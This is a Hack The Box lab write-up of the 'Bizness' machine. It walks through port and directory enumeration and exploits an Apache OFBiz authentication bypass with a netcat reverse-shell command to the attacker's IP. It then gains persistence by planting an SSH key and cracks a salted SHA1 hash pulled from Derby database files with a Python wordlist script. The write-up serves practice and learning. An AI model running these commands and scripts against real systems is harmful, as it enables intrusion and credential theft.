---
title:  "HTB Bizness Writeup"
date:   2024-01-21 00:30:00 
categories: HTB Machine
tags: Authentication_Bypass Binary_exploitation CVE_Exploit
image:  
  path: '/images/bizness/photo_2024-01-28_15-51-54.jpg' 
  src: '/images/bizness/photo_2024-01-28_15-51-54.jpg'
---

&nbsp;


&nbsp;
## Enumeration
```
nmap -sC -sV -p- -T4 --min-rate=9326 --vv bizness.htb
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-20 23:48 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 23:48
Completed NSE at 23:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 23:48
Completed NSE at 23:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 23:48
Completed NSE at 23:48, 0.00s elapsed
Initiating Ping Scan at 23:48
Scanning bizness.htb (10.10.11.252) [4 ports]
Completed Ping Scan at 23:48, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:48
Scanning bizness.htb (10.10.11.252) [65535 ports]
Discovered open port 22/tcp on 10.10.11.252
Discovered open port 80/tcp on 10.10.11.252
Discovered open port 443/tcp on 10.10.11.252
Discovered open port 36213/tcp on 10.10.11.252
Discovered open port 41619/tcp on 10.10.11.252
```
5 port only open for this website but i think this port cant do anything so lets enum directory to find vulnerability to exploit it


![](/images/bizness/2024-01-21-12-45-05.png)

First of all usually me using gobuster for scanning directory but now not working because so i using dirb to scanning directory and its working

`dirb https://bizness.htb /usr/share/dirb/wordlists/common.txt`

```
---- Scanning URL: https://bizness.htb/ ----
==> DIRECTORY: https://bizness.htb/accounting/                                                                                                                                               
==> DIRECTORY: https://bizness.htb/ap/                                                                                                                                                       
==> DIRECTORY: https://bizness.htb/ar/                                                                                                                                                       
==> DIRECTORY: https://bizness.htb/catalog/                                                                                                                                                  
==> DIRECTORY: https://bizness.htb/common/                                                                                                                                                   
==> DIRECTORY: https://bizness.htb/content/                                                                                                                                                  
+ https://bizness.htb/control (CODE:200|SIZE:34633)                                                                                                                                          
==> DIRECTORY: https://bizness.htb/ebay/                                                                                                                                                     
==> DIRECTORY: https://bizness.htb/ecommerce/                                                                                                                                                
+ https://bizness.htb/error (CODE:302|SIZE:0)                                                                                                                                                
==> DIRECTORY: https://bizness.htb/example/                                                                                                                                                  
==> DIRECTORY: https://bizness.htb/images/                                                                                                                                                   
+ https://bizness.htb/index.html (CODE:200|SIZE:27200)                                                                                                                                       
==> DIRECTORY: https://bizness.htb/marketing/               
```

lets check `/accounting` directory

![](/images/bizness/2024-01-21-12-57-36.png)
&nbsp;




&nbsp;

## Apache OFBiz Authentication Bypass Vulnerability (CVE-2023-51467 and CVE-2023-49070)

Look at here . There using Ofbiz vendor on this website so lets google about Ofbiz exploit because `Easy machine` usually using exploit CVE . I found this page github CVE EXPLOIT[Apache-OFBiz-Authentication-Bypass](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) 


now install the tools and running in your linux

`python3 exploit.py --url https://bizness.htb --cmd "nc 10.10.14.116 1337 -c /bin/bash"`

![](/images/bizness/2024-01-21-13-05-31.png)

revshell connected . To login ssh go to your linux generate your id_rsa using `ssh-keygen`
and you just enter until completed . After you generated running this command `cat id_rsa.pub` in /home/kali/.ssh/ and copy your id_rsa.pub and follow my step the below

1.`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYchILzjmmEm2qzhGj0ewpfGQMwfJC83jPMXj0aMOkfpOX/Myw7TbMqH9QvkuWnA+Yi1Jo3n34R865/64lkHXgYTVECH/T0M5Ng+L+BQwwsKwYg5y4nL4FpQV+uAP2eOxR96qBceSIkrGYoYuKzusN3zEkk3HDdvsLBf4b+CPk5GcalIScRcJJPzXcO6KORxqKgPLRoOpccEc4ymNmiQ/GgP0ATxqxDlWwmtLsVw2vF5U/Sw3YPeJ0ztVcoMDj6gEeynVlTVcvgzdrEhM5XKu4uiabbyQ4N201TbImdj1gXNYbcj9AlphhlKvH8Q3wFo8fkbVwj7bM/UcUOTGqHsPAm64nNHRhG8U47raMAt7O7DTlEKE9ZOi0q6Fz7rSZiMxdILBDqa3M6J7ayOg7FkM8DAv+Jey4RzFTEUOMDnrxAxYSbO6QorST6HPz62lMltStM9rMgtw+JdDvq5vVmMqz/nU7o+HjIHpQBAu7OmrGiv+mh7Hsrj76pgBlxFK0kcE= kali@kali" >> authorized_keys`

2.Copy that and go to your revshell 

3.`cd /home/ofbiz/.ssh` or `mkdir /home/ofbiz/.ssh` (if .ssh not created)

4.Paste that on top command 

Now you can login ssh

![](/images/bizness/2024-01-21-13-15-41.png)
&nbsp;








&nbsp;

## Privilege Escalation

![](/images/bizness/2024-01-21-13-27-59.png)

I found files maybe can privilege escalation . I've using linpeas to scanning and trying to priv esc it .

```
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c99c1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c10df1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c10e11.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c6850.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c99a1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c2cc1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c133a1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c5790.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c10e01.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c99e1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c1bd0.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c2cb0.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c99b1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c6870.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c57b0.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c99d1.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c5110.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c9991.dat
```

here the name files i would read one by one but no have anything important lol . Just waste your time so lets go to this folder `/opt/ofbiz/runtime/data/derby/ofbiz/seg0/`
and you will see so much file .dat so im really lazy to read one by one so i just combine the all files using cat

`cat * > test.txt`
after that run this command `strings test.txt | grep SHA` or you can using strings command only to find the password but its takes long time

`$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I` here the password
the password using SHA hashing . And the password using salt is `$d` .To crack password have salt u can using hashcat but now i using tools to crack it

## Crack SHA1 Password

```
import hashlib
import base64
import os
from tqdm import tqdm

class PasswordEncryptor:
    def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
        """
        Initialize the PasswordEncryptor object with a hash type and PBKDF2 iterations.

        :param hash_type: The hash algorithm to use (default is SHA).
        :param pbkdf2_iterations: The number of iterations for PBKDF2 (default is 10000).
        """
        self.hash_type = hash_type
        self.pbkdf2_iterations = pbkdf2_iterations

    def crypt_bytes(self, salt, value):
        """
        Crypt a password using the specified hash type and salt.

        :param salt: The salt used in the encryption.
        :param value: The password value to be encrypted.
        :return: The encrypted password string.
        """
        if not salt:
            salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
        hash_obj = hashlib.new(self.hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
        return result

    def get_crypted_bytes(self, salt, value):
        """
        Get the encrypted bytes for a password.

        :param salt: The salt used in the encryption.
        :param value: The password value to get encrypted bytes for.
        :return: The encrypted bytes as a string.
        """
        try:
            hash_obj = hashlib.new(self.hash_type)
            hash_obj.update(salt.encode('utf-8'))
            hash_obj.update(value)
            hashed_bytes = hash_obj.digest()
            return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
        except hashlib.NoSuchAlgorithmException as e:
            raise Exception(f"Error while computing hash of type {self.hash_type}: {e}")

# Example usage:
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/wordlist/rockyou.txt'

# Create an instance of the PasswordEncryptor class
encryptor = PasswordEncryptor(hash_type)

# Get the number of lines in the wordlist for the loading bar
total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))

# Iterate through the wordlist with a loading bar and check for a matching password
with open(wordlist, 'r', encoding='latin-1') as password_list:
    for password in tqdm(password_list, total=total_lines, desc="Processing"):
        value = password.strip()
        
        # Get the encrypted password
        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))
        
        # Compare with the search hash
        if hashed_password == search:
            print(f'Found Password:{value}, hash:{hashed_password}')
            break  # Stop the loop if a match is found
```

![](/images/bizness/2024-01-21-14-26-27.png)

nah has been cracked 
The Password is : `monkeybizness`

![](/images/bizness/2024-01-21-14-27-46.png)


I hope you all enjoy my writeup : )
